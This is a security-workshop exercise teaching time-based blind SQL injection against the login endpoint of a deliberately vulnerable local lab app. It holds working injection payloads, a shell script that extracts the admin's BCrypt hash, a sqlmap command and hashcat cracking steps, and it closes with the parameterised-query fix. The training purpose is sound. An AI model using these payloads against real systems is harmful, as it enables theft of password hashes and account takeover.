# Exercise 04 — Time-Based Blind SQL Injection: Login

**Difficulty:** Intermediate  
**Category:** Injection  
**OWASP Top 10:** A03:2021 — Injection  
**Config flag:** `BookingDojo:Workshop:LoginSqlInjection`

---

## Scenario

The login endpoint returns only two outcomes: `200 OK` with a token, or `401 Unauthorized`. No query data is ever reflected in the response. A classic in-band injection (Lab 03) would be useless here — there is nothing to read.

But the endpoint is still vulnerable. You will use **response timing** as a side-channel to extract the administrator's BCrypt password hash from the `Users` table — a column that is never returned by any API endpoint.

---

## Background

**Time-based blind SQL injection** works by injecting a conditional sleep into the database query:

```sql
CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END
```

- Response takes ~3 seconds → condition was **true**
- Response is immediate → condition was **false**

By testing conditions character by character, an attacker can reconstruct any string in the database. The HTTP response body is irrelevant — the clock is the oracle.

**What the attacker gains here:** the admin's BCrypt password hash. This column is inaccessible through every other endpoint. Once extracted, it can be cracked offline with hashcat. A password like `Admin1234!` appears in common wordlists and cracks in seconds.

---

## Setup

```bash
docker compose up -d
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &
dotnet run --project src/BookingDojo.Bff &
cd src/bookingdojo-ui && npm run dev &
```

In `src/BookingDojo.Api/appsettings.json`, confirm:

```json
"Workshop": {
  "LoginSqlInjection": "Vulnerable"
}
```

Restart the API if you change the flag.

---

## Step 1 — Observe the attack surface

The login endpoint accepts `username` and `password` and returns `200` or `401`. Try a normal login:

```bash
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' | jq .
# → 401 {"message":"Invalid username or password"}

curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin1234!"}' | jq .
# → 200 {"username":"admin","role":"AdminUser",...}
```

Both failures and successes return the same error message. There is no visible data to steal.

---

## Step 2 — Confirm blind injection with a timing probe

Submit a username that includes a conditional sleep. Use `time` to measure the response:

```bash
time curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND 1=(SELECT 1 FROM pg_sleep(3))--","password":"x"}' | jq .
```

The username payload (unescaped) is:

```
admin' AND 1=(SELECT 1 FROM pg_sleep(3))--
```

This becomes:

```sql
SELECT "Id", "Username", "PasswordHash", "Role", "PartnerId"
FROM bookingdojo."Users"
WHERE "Username" = 'admin' AND 1=(SELECT 1 FROM pg_sleep(3))--'
```

- PostgreSQL finds the `admin` row, then evaluates the AND.
- `pg_sleep(3)` executes — the query sleeps 3 seconds.
- The row is returned to the application, but `BCrypt.Verify("x", hash)` fails → 401.
- **Response is 401, but it took ~3 seconds.**

Now try with a username that does not exist:

```bash
time curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nobody'\'' AND 1=(SELECT 1 FROM pg_sleep(3))--","password":"x"}' | jq .
```

`nobody` matches no row — the AND is never evaluated — no sleep — immediate 401.

**The timing difference confirms injection and reveals valid usernames.**

---

## Step 3 — Extract the password hash character by character

BCrypt hashes always start with `$`. Test whether the admin's hash begins with `$`:

```bash
time curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"admin' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(\\\"PasswordHash\\\",1,1)='$' THEN 3 ELSE 0 END))--\",\"password\":\"x\"}" | jq .
```

The injected SQL:

```sql
WHERE "Username" = 'admin' AND 1=(SELECT 1 FROM pg_sleep(
  CASE WHEN SUBSTRING("PasswordHash",1,1)='$' THEN 3 ELSE 0 END))--'
```

- If the first character of `PasswordHash` is `$` → sleeps 3 seconds → condition **true**
- Change `'$'` to `'x'` → immediate response → condition **false**

---

## Step 4 — Script the full extraction

```bash
#!/bin/sh
# Extracts the admin BCrypt hash (60 chars) via time-based blind SQLi.
# Adjust SLEEP_THRESHOLD (ms) for network latency.

SLEEP_THRESHOLD=1500
CHARS='$2b.0123456789/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
HASH=""

for i in $(seq 1 60); do
  j=1
  while [ $j -le ${#CHARS} ]; do
    c=$(printf '%s' "$CHARS" | cut -c$j)
    PAYLOAD="admin' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(\\\"PasswordHash\\\",$i,1)='${c}' THEN 2 ELSE 0 END))--"
    START=$(date +%s%3N)
    curl -s -X POST http://localhost:5001/bff/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"${PAYLOAD}\",\"password\":\"x\"}" > /dev/null
    ELAPSED=$(( $(date +%s%3N) - START ))
    if [ "$ELAPSED" -gt "$SLEEP_THRESHOLD" ]; then
      HASH="${HASH}${c}"
      echo "[$i] '${c}'  ->  ${HASH}"
      break
    fi
    j=$(( j + 1 ))
  done
done

echo ""
echo "Recovered hash: ${HASH}"
```

> In a real engagement, use **sqlmap**:
```
python sqlmap.py -u 'http://localhost:5001/bff/auth/login' \
  --data '{"username":"*","password":"x"}' \
  --technique=T \
  --dbms=PostgreSQL \
  --level=5 \
  --ignore-code=401 \
  --headers="Content-Type: application/json"
```

---

## Step 5 — Crack the hash offline

```bash
echo '$2b$10$<rest of hash>' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/passwords.txt
```

`Admin1234!` is in many wordlists. Expect a result within seconds on a GPU, minutes on CPU.

---

## Step 6 — Apply the fix

In `appsettings.json`:

```json
"LoginSqlInjection": "Fixed"
```

Restart the API. Re-run the 3-second timing probe from Step 2 — the response is now immediate regardless of whether `admin` exists.

The fixed code:

```csharp
// WORKSHOP: FIXED PATH
user = await _db.Users
    .FirstOrDefaultAsync(u => u.Username == username);
```

EF Core generates:

```sql
SELECT ... FROM bookingdojo."Users" WHERE "Username" = $1
```

`$1` is bound as a typed parameter. The `pg_sleep` payload lands in `$1` as a literal string — no username matches it, no sleep, no data.

---

## Step 7 — Discussion

| Aspect | Detail |
|--------|--------|
| Why login? | Login queries the Users table by username — the same table that holds password hashes. |
| Why timing? | The response body is always the same (401). Timing is the only observable difference. |
| Why BCrypt? | BCrypt is strong against cracking, but the hash itself must never leave the database. Once an attacker has it, cracking is just a matter of time and compute. |
| Classic bypass vs. blind | `' OR '1'='1` bypasses login; this attack *extracts data* without bypassing anything. Both root cause: string concatenation. |

---

## Key Takeaways

- **Suppressing output does not stop injection.** The login endpoint reveals nothing in its body — yet an attacker can extract 60 characters of sensitive internal data through timing alone.
- **Time is always observable.** Any injectable query, anywhere in the application, can be exploited for data exfiltration if the attacker can measure response time.
- **Parameterise at the source.** The fix is one line of EF Core LINQ. Every raw SQL query that touches user input is a potential blind injection vector.

---

## Further Reading

- [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger: Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- [PostgreSQL pg_sleep](https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY)
- [Hashcat BCrypt (mode 3200)](https://hashcat.net/wiki/doku.php?id=hashcat)
